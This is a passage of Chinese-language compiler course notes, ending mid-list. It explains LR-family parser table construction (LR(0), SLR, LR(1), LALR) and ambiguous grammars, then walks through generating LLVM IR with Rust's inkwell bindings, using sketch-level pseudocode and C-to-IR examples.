<p>具体怎么做，使用的是**Shift-reduce(移入-归约)**分析，这时自底向上语法分析的通用框架。所有重要的自底向上方法对于手工编码而言都太复杂了，但是对于诸如Yacc的分析程序生成器却很合适。移入-归约分析：</p>
<ul>
<li>他用一个栈来保存文法符号，用一个输入缓冲区来存放将要进行语法分析的其他符号。</li>
<li>在对输入串的一次从左到右的扫描中，语法分析器逐个将<em>输入符号</em> <strong>移入</strong>到栈顶，直到可以对栈顶的一个<em>文法符号串β</em>进行<strong>归约</strong>为止。他将β归约为某个产生式的头。</li>
<li>语法分析器不断的重复着上面的扫描过程，知道它检测到一个语法错误，或者栈中包含了开始符号并且输入缓冲区空了，这说明分析成功。</li>
</ul>
<p>所以，怎么根据Token和所谓的当前状态决定下一个动作呢？我们有两个表，<code>ACTION</code>和<code>GOTO</code>，统称<strong>LR分析表</strong>。</p>
<ol>
<li><code>ACTION[s][t]</code>表示，在当前state为<code>s</code>，而下一个输入的token为<code>t</code>时，要执行的动作，有4种
<ol>
<li>Shift. Shift the next input symbol onto the top of the stack.</li>
<li>Reduce. The right end of the string to be reduced must be at the top of the stack. Locate the left end of the string within the stack and decide with what nonterminal to replace the string.</li>
<li>Accept. Announce successful completion of parsing.</li>
<li>Error. Discover a syntax error and call an error recovery routine.</li>
</ol>
</li>
<li><code>GOTO[n]</code>，表示在归约到<code>n</code>之后，状态的转移。</li>
</ol>
<p>关于如何构造LR分析表，不同的文法有不同的构造方式，一会儿再介绍，不过利用他们我们可以完成分析，分析过程的代码如下。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum Action {
    Shift,  // 第几个状态
    Reduce(u32), // 第几条产生式
    Error(&amp;'static str),
    Accept
}

fn parse(input: &amp;[Token]) {
    let mut state = 0;       // 一开始的状态是初始状态
    let mut stack = vec![];  // 一开始符号栈是空的
    let mut input = input.iter();
    loop {
        let token = input.next().unwrap();
        match ACTION(state, token) {
        	Action::Reduce(pr) =&gt; {
                let (A, beta) = PRODUCTION[pr]; // 这个的类型还没有考虑，A-&gt;beta
                for _ in 0..beta.len() {        // 弹出栈顶的|beta|个符号
                    stack.pop();
                }
                stack.push(A);
                state = GOTO[state][A];
                ...
            },
        	Action::Shift =&gt; {
                stack.push(token);
            },
            Action::Accept =&gt; break,
        	Action::Error(e) =&gt; panic!(&quot;Error: {}&quot;,e),
    	}
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>​	<img src="Basic/Compiler/../images/image-20220619205202318.png" alt="image-20220619205202318" /></p>
<p>P.S. 浙江大学的课件中符号栈叫做parsing stack</p>
<h3 id="冲突"><a class="header" href="#冲突">冲突</a></h3>
<!-- 用LR文法需要消除右递归？ -->
<p>就像top-down parsing不能解决左递归的文法，并不是所有的CFG都能使用移入-归约语法分析技术。对于这样的文法，直接使用移入归约分析会陷入下面的问题：即使知道了栈中的所有内容和接下来的k个输入符号，我们仍然<strong>无法判断应该进行移入操作还是归约操作，或者无法在多个可能的归约方法中选择正确的归约动作</strong>，这就是冲突。</p>
<p>冲突反应在LR(1)/LALR状态机上，就是对同一个状态，里面有1-n个归约动作和0-m个移入动作。如果<em>归约动作的展望符</em>和<em>移入的字符</em>彼此都不同则没有冲突，如果彼此之间的展望符相同则发生冲突。冲突反应在LR(0)/SLR(1)状态机上，如果对同一个状态，里面有归约动作，但是还有别的动作，那么LR(0)就会发生冲突；如果对同一个状态，里面有1-n个归约动作和0-m个移入动作，如果<em>归约动作的FOLLOW集</em>和<em>移入的字符</em>彼此都不同则没有冲突。</p>
<p>接下来，将要介绍4种分析表的构造方式，分别是LR(0), SLR, LR(1)和LALR。<strong>如果一个文法，使用LR(0)的构造方式没有产生冲突，那么就说该文法是LL(0)的，其他亦然</strong>。下面会介绍每个文法的</p>
<ol>
<li>自动机状态(项目集闭包)的构造方法。</li>
<li>自动机的构造方法。</li>
<li>分析表的构造方法。</li>
</ol>
<p>分析能力上，LR(0) &lt; SLR &lt; LALR(1) &lt; LR(1)</p>
<h3 id="lr0"><a class="header" href="#lr0">LR(0)</a></h3>
<p>在介绍LR(0)分析表构造方法之前，要先了解下面这些概念：</p>
<ul>
<li>增广文法：如果G 是一个以S为开始符号的文法，则G的增广文法 G' 就是在G中加上新开始符号S' 和产生式S' → S而得到的文法。</li>
<li>初始项目：如下面的<code>·S'</code>。</li>
<li>接收项目：如下面的<code>S'·</code>。</li>
<li>归约项目：原点的位置在最后。<code>A-&gt; XYZ·</code>就是归约项目，是时候把<code>XYZ</code>归约成<code>A</code>了</li>
<li>后继项目：同属于一个产生式的项目，但圆点的位置只相差一个符号，则称后者是前者的后继项目。比如<code>A-&gt; XYZ·</code>就是<code>A-&gt; XY·Z</code>的后继项目。</li>
<li>等价项目：凡是圆点后面存在非终结符的时候就存在等价项目，如下面例子中的<code>S' -&gt; ·S</code>，那么也就是在等待S能推导出的式子，<code>S -&gt; ·BB</code>，这两个项目就是等价项目。</li>
</ul>
<p>最后是一个例子。例子中的每一个黄色的框就是一个项目集闭包，对应LR(0)自动机的一个状态。</p>
<p><code>closure</code>的构造：LR(0) 项目集闭包的构造还是很简单的。<code>·</code>的意思是“等待”，如果等待的是非终结符，如上面例子中的<code>S' -&gt; ·S</code>，那么也就是在等待S能推导出的式子，<code>S -&gt; ·BB</code>，也加入到项目集中（其实就是上面说的等价项目）。伪代码如下，输入项目集（若干个项目的集合），输出该项目集闭包。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// I: 某个项目
fn closure (I: HashSet&lt;Item&gt;) -&gt; HashSet&lt;Item&gt; {
	let mut J = I;
    let mut continue = true;
	while (continue){
        continue = false;
        for A → α·Bβ in J {
            // G 指的是该文法
        	for (G的每个产生式B → γ) {
                // insert如果已经存在返回false
                continue ||= J.insert(B → ·γ);     
            }
        }
    }
	J
}
<span class="boring">}
</span></code></pre></pre>
<p>我们知道了状态(项目集闭包)的构造，那么LR(0)自动机的构造，其实就是将<strong>项目集闭包</strong>和<strong>他的某个符号的后继项目的项目集闭包</strong>，用<strong>正在等待的符号</strong>连接。不过中间还涉及到两个过程。是<code>goto</code>的构造和Canonical LR(0) Collection的构造，其实就是状态的转移和所有状态的构造。</p>
<blockquote>
<p>其实从上面的表述就可以看出潜在的冲突。“他的某个符号的后继项目”，可能对于某个项目集闭包，不只有一个。而且，如果不只一个，且不是等价项目，那么就会出问题。这个可以看后面的其他文法。</p>
</blockquote>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn goto(I: HashSet&lt;Item&gt;,X:Symbol) -&gt; HashSet&lt;Item&gt;{
    let J = HashSet::new();
    for A → α·Bβ in I {
        J.insert(A → α·Bβ);
    }
}
fn collection() {
    let C:HashSet&lt;HashSet&lt;Item&gt;&gt; = set![closure(set![S' -&gt; ·S])];
    let mut continue = true;
    while continue{
        continue = false;
        for I in C {
            for G的每一个文法符号X，别忘了结束符$ {
                let a = goto(I,X);
                if !a.is_empty() {
                    continue ||= C.insert(a);
                }
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>令$I_i$对应状态$i$。状态$i$的语法分析表按照下面的方法构造，$sj$表示移入，$rj$表示使用第$j$条产生式归约。$V_T$指的是Terminal集合。</p>
<ul>
<li>
<p>if $A→α·aβ∈I_i$ and $GOTO( I_i , a )=I_j$ then $ACTION[ i, a ]=sj$</p>
</li>
<li>
<p>if $A→α·Bβ∈I_i$ and $GOTO( I_i , B )=I_j$ then $GOTO[i,B]=j$</p>
</li>
<li>
<p>if $A→α·∈I_i$ 且 $A ≠ S'$ then for $a∈V_T∪{$}$ do $ACTION[i,a]=rj$（j是产生式A→α的编号） </p>
</li>
<li>
<p>if $S'→S· ∈I_i$ then $ACTION [ i, $ ]=acc$</p>
</li>
<li>
<p>没有定义的所有条目都设置为$error$</p>
</li>
</ul>
<p>LR0自动机构造例子，https://www.bilibili.com/video/BV1zW411t7YE?p=28&amp;t=396.6。</p>
<p><img src="Basic/Compiler/../images/image-20220228131409573.png" alt="image-20220228131409573" /></p>
<h3 id="slr1"><a class="header" href="#slr1">SLR(1)</a></h3>
<p>比LR(0)更强的一点的是SLR(1)，也叫SLR。SLR的基本思想是，LR(0)对于归约规则太草率，怎么<code>A-&gt;B·</code>后面无论跟着什么终结符都可以进行归约呢？显然后面的终结符，一定是<code>FOLLOW(A)</code>的元素嘛。还记得FOLLOW集吗，在某个句型紧跟在A后面的非终结符的集合。</p>
<p>SLR的状态机和LR(0)是一样的。不过在构造分析表的时候有所不同，其实只有第三条不同。</p>
<ul>
<li>if $A→α·aβ∈I_i$ and $GOTO(I_i,a)=I_j$ then $ACTION[i,a]=sj$</li>
<li>if $A→α·Bβ∈I_i$ and $GOTO(I_i,B)=I_j$ then $GOTO[i,B]=j$</li>
<li>if $A→α·∈I_i$ and $A ≠ S'$ then for $\forall a ∈ FOLLOW(A)$ do $ACTION[i,a]=rj$ （$j$是产生式$A→α$的编号） </li>
<li>if $S'→S·∈I_i$ then $ACTION [ i , $ ]=acc$</li>
<li>没有定义的所有条目都设置为$error$</li>
</ul>
<p><img src="Basic/Compiler/../images/image-20220411222052512.png" alt="image-20220411222052512" /></p>
<h3 id="lr1-star2"><a class="header" href="#lr1-star2">LR(1) :star2:</a></h3>
<p>SLR只是简单地考察下一个输入符号$b$是否属于与归约项目$A→α$相关联的$FOLLOW(A)$，但$b∈FOLLOW(A)$只是归约$α$的一个必要条件，而非充分条件。</p>
<p><strong>LR(1):<strong>不过并不是所有的Context-free grammar都是上面介绍的</strong>LR(0)<strong>或SLR有时我们需要向前查看k个符号才知道该执行什么动作，有价值的是k=1，就是</strong>LR(1)</strong>。</p>
<p>LR(1)状态机的状态和之前两个就不一样了。我们要了解<strong>规范LR(1)项目</strong>和<strong>展望符</strong>的概念。将一般形式为 $[A→α·β, a]$的项称为 <strong>LR(1)项(规范LR(1)项目)</strong>，其中$A→αβ$ 是一个产生式，$a$是一个终结符(这里将$视为一个特殊的终结符)它表示在当前状态下，A后面必须紧跟的终结符，称为该项的<strong>展望符(lookahead)</strong> 。LR(1) 中的1指的是项的展望符的长度。</p>
<ul>
<li>在形如$[A→α·β, a]$且$β ≠ ε$的项中，展望符$a$没有任何作用</li>
<li>但是一个形如$[A→α·, a]$的项在只有在下一个输入符号等于$a$时才可以按照$A→α$ 进行归约，这样的a的集合总是FOLLOW(A)的子集，而且它通常是一个真子集。（SLR就是简单的认为a的集合就是FOLLOW(A)）</li>
</ul>
<p>那么，LR(1)的项目集闭包（closure函数）, 状态机（goto函数和collection函数）又要怎么构造呢？代码如下，意思其实也很简单。之前是如果在<code>·B</code>就把B的产生式<code>B-&gt;·γ</code>也加进来；现在对<code>[·Bβ,a]</code>是把<code>[B-&gt;·y, FIRST(βa)]</code>加进来，其实就是对展望符多了限制。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// I: 某个项目
fn closure (I: HashSet&lt;Item&gt;) -&gt; HashSet&lt;Item&gt; {
    let mut J = I;
    let mut continue = true;
    while (continue){
        continue = false;
        for [A → α·Bβ,a] in J {
            // G 指的是该文法
            for G的每个产生式B → γ {
                // 注意这里是和LR(0)不同的地方
                // β如果不是空，FIRST(β)就和a没有任何关系
                for b in FISRT(βa) { 
                    continue ||= J.insert([B-&gt;·y,b]);
                }
            }
        }
    }
    J
}
<span class="boring">}
</span></code></pre></pre>
<p>那么LR(1)自动机的构造，和LR(0)就很相似了。其实就是将<strong>项目集闭包</strong>和<strong>他的某个符号的后继项目的项目集闭包</strong>，用<strong>正在等待的符号</strong>连接。不过中间还涉及到两个过程。是<code>goto</code>的构造和Canonical LR(1) Collection的构造。和LR(0)很相似。看下面的代码，只有第3、4、8行不同。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn goto(I: HashSet&lt;Item&gt;,X:Symbol) -&gt; HashSet&lt;Item&gt;{
    let J = HashSet::new();
    for [A → α·Bβ, a] in I {
        J.insert([A → α·Bβ, a]);
    }
}
fn collection() {
    let C:HashSet&lt;HashSet&lt;Item&gt;&gt; = set![closure(set![S' -&gt; ·S, $])];
    let mut continue = true;
    while continue{
        continue = false;
        for I in C {
            for G的每一个文法符号X，别忘了结束符$ {
                let a = goto(I,X);
                if !a.is_empty() {
                    continue ||= C.insert(a);
                }
            }
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>令$I_i$对应状态$i$。状态$i$的语法分析表按照下面的方法构造，$sj$表示移入，$rj$表示使用第$j$条产生式归约。</p>
<ul>
<li>if $[A→α·aβ, b ] ∈I_i$ and $GOTO( Ii , a )=I_j$ then $ACTION[ i, a ]=sj$</li>
<li>if $[A→α·Bβ,b ] ∈I_i$ and $GOTO( Ii , B )=I_j$ then $GOTO[ i, B ]=j$</li>
<li>if $[A→α·, a ] ∈Ii$且$A ≠ S'$ then $ACTION[ i, a ]=rj$（j是产生式A→α的编号） </li>
<li>if $[S'→S·, $] ∈Ii$ then $ACTION [ i, $ ]=acc$;</li>
<li>没有定义的所有条目都设置为$error$</li>
</ul>
<p><img src="Basic/Compiler/../images/image-20220411222333300.png" alt="image-20220411222333300" /></p>
<h3 id="lalr分析法"><a class="header" href="#lalr分析法">LALR分析法</a></h3>
<p>LALR(lookahead LR)的思想是合并LR(1)中的一些状态，准确的说是合并<strong>同心项集</strong>，因为LR(1)的状态非常的多。如果合并之后分析表没有产生冲突那么文法就是LALR的。其实所谓的“心”，指的是项目的第一分量。比如LR(1)例子中的I8和I10，里面的项的“心”都是<code>R-&gt;L·</code>，所以说他们是同心的。</p>
<p>LALR分析法可能会作多余的reduce动作，但绝不会作错误的shift操作。如果一个文法是LR(1)的，想把他转化成LALR(1)，可能会带来reduce-reduce冲突，但是不会带来shit-reduce冲突。</p>
<p>这个例子的文法和LR(1)的是一样的。</p>
<p><img src="Basic/Compiler/../images/image-20220411231617051.png" alt="image-20220411231617051" /></p>
<h2 id="ambiguous-grammar"><a class="header" href="#ambiguous-grammar">Ambiguous grammar</a></h2>
<p>可生成带有两个不同分析树的串的文法称作<strong>二义性文法(Ambiguous grammar)</strong>。每个二义性文法都不是LR的。但是某些类型的二义性文法在语言的描述和实现中很有用。</p>
<p>重写文法以消除二义性的方法，通常我们通过优先级和结合律来消除二义性：</p>
<ol>
<li>为了处理文法中的运算优先权问题，就必须把具有相同优先权的算符归纳在一组中，并为每一种优先权规定不同的规则。</li>
<li>左递归规则使得它的算符在左边结合，而右递归规则使得它们在右边结合（Left recursion is commonly used to make operations left associative）。</li>
</ol>
<p>比如，对于一个简单算术的文法，二义性版本。这个的二义性是显然的。</p>
<pre><code>E  -&gt; E op E | E | number
op -&gt; * | - | + 
</code></pre>
<p>先给他来一个优先级，不过还是二义性的。比如10-5-2，分析树可以是(- (- 10 5) 2)，也可以是(- 10 (- 5 2))。</p>
<pre><code>E -&gt; E opadd E | T
opadd -&gt; + | -
T -&gt; T * T | number
</code></pre>
<p>在给他加上左结合，这样就消除了二义性。比如10-5-2，分析树就只能是(- (- 10 5) 2)。有时候二义性是无关紧要的，比如对于10+5+2，无论是(+ (+ 10 5) 2)还是(+ 10 (+ 5 2))的结果是一样的，不过对于分析算法来说，总是要选一个。</p>
<pre><code>E -&gt; E opadd T | T
opadd -&gt; + | -
T -&gt; T * number | number
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="llvm-ir"><a class="header" href="#llvm-ir">LLVM-IR</a></h1>
<p>LLVM-IR，即LLVM中间代码，有三种表示方式，他们互相之间是等价的。</p>
<ol>
<li>内存中的LLVM IR （为了编译器快速处理）</li>
<li>⽐特码形式的LLVM IR （为了给方便给JIT complier使用）</li>
<li>可读形式的LLVM IR （为了给人看）</li>
</ol>
<p>回忆编译原理的内容，我们完成语法分析和语义分析，生成了抽象语法树AST时，下面我们想要生成中间代码。LLVM-IR就是一种中间代码。根据AST⽣成对应的LLVM IR，这也就是编译器前端所做的事，编译器后端则是将LLVM IR转换成具体的机器语言。所以LLVM-IR是沟通前后端的桥梁。如果我们想要写一个编译器，那么我们完成前端部分生成LLVM-IR，后端部分就不用我们自己动手了。</p>
<p>下面这个图很好的展现了llvm ir的构造。</p>
<p><img src="Basic/Compiler/../images/image-20220326002625903.png" alt="IR layout" /></p>
<ul>
<li>Module：可以认为Module是LLVM的编译单元。
<ul>
<li>Global Variable：全局变量。</li>
<li>Function declaration：函数声明。</li>
<li>Function definition：函数定义。
<ul>
<li>Argument：函数的参数</li>
<li>Entry Basic Block：函数入口</li>
<li>Basic Blocks：Basic block满足下面两个条件的指令序列，所以你可以认为BasicBlock是相对于控制流的基本单元。
<ol>
<li>控制流只能从BasicBlock的<strong>第一个指令</strong>进入该块。</li>
<li>除了BasicBlock的最后一个指令（Terminator Instructoin），控制流在离开基本块之前不会跳转或停机。</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="ir生成"><a class="header" href="#ir生成">IR生成</a></h2>
<p>我们已经了解了LLVM-IR的基本结构。那么，我们要怎么生成LLVM-IR呢？这需要了解一下LLVM提供的接口。LLVM是用C++写的，但是我不太喜欢C++，所以下面的是LLVM的Rust-binding，来自<a href="https://thedan64.github.io/inkwell/inkwell/index.html">inkwell</a>。</p>
<ul>
<li><code>LLVMContext</code>: is an <strong>opaque</strong> object that owns a lot of core LLVM data structures, such as the type and constant value tables. We don’t need to understand it in detail, we just <strong>need a single instance to pass into APIs that require it</strong>.</li>
<li><code>IRBuilder</code>: This provides a uniform API for <strong>creating instructions and inserting them into a basic block</strong>: either at the end of a BasicBlock, or at a specific iterator location in a block.</li>
</ul>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let context = Context::create();
let builder = context.create_builder();
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>
<p><code>Module</code>: 包括Function和Global Variable</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let module = context.create_module(&quot;hello&quot;);
<span class="boring">}
</span></code></pre></pre>
<ul>
<li>
<p><code>Target</code>: 表示特定的后端构建目标。</p>
</li>
<li>
<p><code>FunctionValue</code>: 给module添加一个函数。先利用构造函数的类型。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let fn_type: FunctionType = context.i32_type().fn_type(&amp;[], false);
let func: FunctionValue = module.add_function(&quot;hello&quot;, fn_type, None);
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p><code>GlobalValue</code>: 给module添加一个全局变量，我们可以声明变量的类型和名字，还有他的链接方式。全局变量可以是外部链接的。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let global: GlobalValue = module.add_global(context.i32_type(), None, &quot;i&quot;);
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
</li>
<li>
<p><code>Function</code>: 包括Arguments和Basic Block。Argument的类型在之前给module添加函数的时候就已经确定了，所以我们接下来要往Function中添加BasicBlock。</p>
<ul>
<li>
<p><code>BasicBlock</code>: 给一个函数添加basic block。下面的三种插入方法，可以给函数依次插入block0, block1, block2。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let basic_block = context.append_basic_block(func, &quot;block1&quot;);
context.insert_basic_block_after(basic_block, &quot;block2&quot;);
context.prepend_basic_block(basic_block, &quot;block0&quot;);
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
</li>
<li>
<p><code>BasicBlock</code>: 由很多instruction组成。并且一个terminate instruction是必要的。接下来我们要给Basic Block添加instruction，这就是<code>builder</code>发挥作用的地方了。</p>
<p>首先要给builder定位在Basic Block的某个位置。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>builder.position_at_end(block);
builder.position_at(basic_block, instruction);
builder.position_before(instruction);
builder.clear_insertion_position();
<span class="boring">}
</span></code></pre></pre>
<p>然后可以用<code>builder</code>的<code>build_xxx</code>方法创建各种指令，也可以认为是创建各种<code>Value</code>。</p>
<p>如何确保有一个terminate instruction呢？可以用<code>builder.get_terminator</code>，如果返回值是<code>None</code>说明没有terminate instruction。这时我们应该手动给他添加一个terminate instruction。比如，如果是函数的最后的话加上ret，是一个一般的分支指令，可以加上无条件跳转指令到下一个basicblock。</p>
</li>
<li>
<p>最后来看<code>Instruction</code>，其实是看<code>Value</code>。</p>
<ul>
<li>
<p><code>Value</code> represents a <strong>typed value</strong> that may be used (among other things) as an <strong>operand</strong> to an instruction. 有各种各样的Value，包括<code>Instruction</code>也是<code>Value</code>。</p>
<p>One important aspect of LLVM is that there is <strong>no distinction between an SSA variable and the operation that produces it</strong>。对于这一点，你可能感到有点奇怪，比如下面的两条指令，第一个是SSA可以理解，<code>%x</code>是一个<code>PionterValue</code>，那第二个是啥玩意儿？其实第二个是<code>InstructionValue</code>。总之都是<code>Value</code>。</p>
<pre><code class="language-ir">%x = alloca i32, align 4
store i32 1, i32* %x, align 4
</code></pre>
<p>inkwell用<code>AnyValueEnum</code>和<code>AnyValue</code>来概括所有的<code>Type</code>。当然每种<code>Value</code>都有他自己的特殊的属性，这里就不详细介绍了。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub enum AnyValueEnum&lt;'ctx&gt; {
    ArrayValue(ArrayValue&lt;'ctx&gt;),
    IntValue(IntValue&lt;'ctx&gt;),
    FloatValue(FloatValue&lt;'ctx&gt;),
    PhiValue(PhiValue&lt;'ctx&gt;),
    FunctionValue(FunctionValue&lt;'ctx&gt;),
    PointerValue(PointerValue&lt;'ctx&gt;),
    StructValue(StructValue&lt;'ctx&gt;),
    VectorValue(VectorValue&lt;'ctx&gt;),
    InstructionValue(InstructionValue&lt;'ctx&gt;),
}
pub trait AnyValue&lt;'ctx&gt;: AsValueRef + Debug {
    fn as_any_value_enum(&amp;self) -&gt; AnyValueEnum&lt;'ctx&gt; { ... }
    fn print_to_string(&amp;self) -&gt; LLVMString { ... }
}
<span class="boring">}
</span></code></pre></pre>
</li>
<li>
<p>每个<code>Value</code>都有一个<code>Type</code>。可以认为<code>Value</code>是<code>Type</code>的实体。<code>Type</code>可以从context的方法构造，<code>Type</code>之间可以组合成新的<code>Type</code>。你也可以使用每种<code>Value</code>都有的<code>get_type</code>方法获取他的<code>Type</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let t1:IntType = context.i64_type();
let t2:ArrayType = context.i64_type().array_type(2);
<span class="boring">}
</span></code></pre></pre>
<p>inkwell用<code>AnyTypeEnum</code>和<code>AnyType</code>来概括所有的<code>Type</code>。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub enum AnyTypeEnum&lt;'ctx&gt; {
    ArrayType(ArrayType&lt;'ctx&gt;),
    FloatType(FloatType&lt;'ctx&gt;),
    FunctionType(FunctionType&lt;'ctx&gt;),
    IntType(IntType&lt;'ctx&gt;),
    PointerType(PointerType&lt;'ctx&gt;),
    StructType(StructType&lt;'ctx&gt;),
    VectorType(VectorType&lt;'ctx&gt;),
    VoidType(VoidType&lt;'ctx&gt;),
}
pub trait AnyType&lt;'ctx&gt;: AsTypeRef + Debug {
    fn as_any_type_enum(&amp;self) -&gt; AnyTypeEnum&lt;'ctx&gt; { ... }
    fn print_to_string(&amp;self) -&gt; LLVMString { ... }
}
<span class="boring">}
</span></code></pre></pre>
</li>
</ul>
</li>
</ul>
<p><a href="https://github.com/PAN-Ziyue/GNC/blob/main/src/codegen.rs">一个生成LLVM-IR的例子</a>。</p>
<h2 id="一些具体的翻译方式"><a class="header" href="#一些具体的翻译方式">一些具体的翻译方式</a></h2>
<p>这里推荐的学习方式，是用<code>clang -S -emit-llvm hello.c</code>的方式，生成中间代码<code>hello.ll</code>，然后阅读C源代码是怎么被翻译成LLVM-IR的。</p>
<h3 id="变量定义和使用"><a class="header" href="#变量定义和使用">变量定义和使用</a></h3>
<p>变量可以存储在哪里呢？回顾一下C语言的内存模型，无非就是：</p>
<ol>
<li>寄存器中，这肯定是局部变量。</li>
<li>栈上，也是局部变量，如果我们需要地址的话就不能存在寄存器，只能存在栈中。</li>
<li>静态数据区，全局变量。</li>
<li>堆上。这个是通过内存分配函数分配的，当做前三种的指针指向的内存就好。</li>
</ol>
<p>所以，当我们声明一个全局变量的时候（不考虑外部链接），其实是在静态数据区分配了一段内存，然后我们需要用对应的<strong>指针</strong>操作这一块内存；如果我们需要分配（可变的）局部变量，那么我们可以在栈上开辟一块内存，然后用对应的指针操作这一块内存；如果我们需要分配一个不变的局部变量（或者是计算的中间值），我们可以用寄存器来做存储，LLVM的寄存器是无限的。比如下面这个例子</p>
<pre><code class="language-c">int a = 1;   // 全局变量
int main() {
    int b = (a + 1) / 3 ;  // 局部变量
    return 0;
}
</code></pre>
<p>我们看对应的汇编代码，做了一点改动便于阅读。注意两个特点，一个是寄存器(%开头的变量)只能被赋值一次，叫做SSA；一个是使用load/store操作内存，这个和其他的RISC汇编类似。</p>
<pre><code class="language-llvm">@a = dso_local global i32 1, align 4    ; 全局变量

define dso_local i32 @main() #0 {
  %b = alloca i32, align 4              ; 分配了一个局部变量
  %3 = load i32, i32* @a, align 4       ; 使用全局变量，要用load加载
  %4 = add nsw i32 %3, 1                ; 中间的计算结果用寄存器存储
  %5 = sdiv i32 %4, 3
  store i32 %5, i32* %b, align 4        ; 给局部变量赋值
  ret i32 0
}
</code></pre>
<h3 id="如何表达数组结构体这个概念"><a class="header" href="#如何表达数组结构体这个概念">如何表达数组/结构体这个概念</a></h3>
<p>把他们放在一起是因为在LLVM中他们的表达方式是类似的。我们需要用到<a href="https://llvm.org/docs/LangRef.html#getelementptr-instruction"><code>getelementptr</code></a>(简称GEP)指令，顾名思义他是用来计算元素的地址的。官方有一个<a href="https://llvm.org/docs/GetElementPtr.html">答疑文章</a>。以数组为例，下面这段代码，有三个点，定义数组，给数组赋值，取数组的值。</p>
<pre><code class="language-c">int main() {
    int a[10];
    a[2] = 3;
    return a[2];
}
</code></pre>
<p>看看被翻译成什么指令。分配没什么特别的。关键就是GEP指令取了地址，然后就是对地址做操作罢了。</p>
<pre><code class="language-llvm">define dso_local i32 @main() #0 {
  %a = alloca [10 x i32], align 16       ; 分配一块内存空间
      
  %3 = getelementptr inbounds [10 x i32], [10 x i32]* %a, i64 0, i64 2 
  store i32 3, i32* %3, align 8          ; 修改值
  
  %4 = getelementptr inbounds [10 x i32], [10 x i32]* %a, i64 0, i64 2 
  %5 = load i32, i32* %4, align 8        ; 取值
  
  ret i32 %5
}
</code></pre>
<p>GEP的基本格式是<code>getelementptr inbounds &lt;ty&gt;, &lt;ty&gt;* &lt;ptrval&gt;{, [inrange] &lt;ty&gt; &lt;idx&gt;}*</code>，先是类型声明，然后是一个该类型的指针。这是我们取地址的起点。之后就是若干个索引。看到这里，你会很迷惑，上面的索引为什么是<code>0,2</code>，单走一个<code>2</code>不就好了吗？其实要这么理解，ptr的类型是<code>[10 x i32]*</code>，用C语言描述就是<code>int* ptr []</code>，也就是<code>int **ptr</code>，所以<code>&amp;ptr[0][2]</code>表达的才是数组的第二个元素。如果你还是无法理解，可以再看下面的例子，这也是取地址的操作。</p>
<pre><code class="language-c">int main() {
    int a[10];
    int *p;      // %p = alloca i32*, align 8
    p = a        // %4 = getelementptr inbounds [10 x i32], [10 x i32]* %2, i64 0, i64 0
                 // store i32* %4, i32** %p, align 8
                 // %5 = load i32*, i32** %3, align 8
    return p[1]; // %6 = getelementptr inbounds i32, i32* %5, i64 1
                 // %7 = load i32, i32* %6, align 4
}
</code></pre>
<h2 id="如何表达各种控制流"><a class="header" href="#如何表达各种控制流">如何表达各种控制流</a></h2>
<p>再回顾一下Basic Block，一个基本块由下面几个内容组成：</p>
<ol>
<li>Label（标签可以省略，会自动加上）</li>
<li>Instructions </li>
<li>Terminator Instruction（终结指令，比如branch<code>br</code>和function return<code>ret</code>，详细看<a href="https://llvm.org/docs/LangRef.html#terminator-instructions">文档</a>）</li>
</ol>
<p>控制指令，其实就是各种在Basic Block中间跳转的指令。LLVM提供了哪些控制指令呢？</p>
<ul>
<li>
<p><code>icmp</code>：LLVM IR提供的⽐较指令为 <code>icmp</code>。其接受三个参数：⽐较⽅案以及两个⽐较参数。比如</p>
<pre><code class="language-assembly">%comparison_result = icmp uge i32 %a, %b
</code></pre>
<p>的语义就是</p>
<pre><code class="language-c">bool comparison_result = ((unsigned int)a &gt;= (unsigned int)b);
</code></pre>
</li>
<li>
<p><code>br</code>：条件跳转如果<code>comparision_result = true</code>跳转到A，<code>=false</code>跳转到B。和无条件跳转</p>
<pre><code>    br i1 %comparison_result, label %A, label %B
A:
    ; do something A
    ; terminator
B:
    ; do something B
    
; ==============
start:
     br label %start
</code></pre>
</li>
<li>
<p><code>select</code>：指令接受三个参数。第⼀个参数是⽤来判断的布尔值，也就是 i1 类型的 icmp 判断的结果，如
果其为 true ，则返回第⼆个参数，否则返回第三个参数。</p>
<pre><code class="language-assembly">%y = select i1 %result, i32 1, i32 2
</code></pre>
<p>的语义为</p>
<pre><code class="language-c">i32 y = result ? 1 : 2;
</code></pre>
</li>
<li>
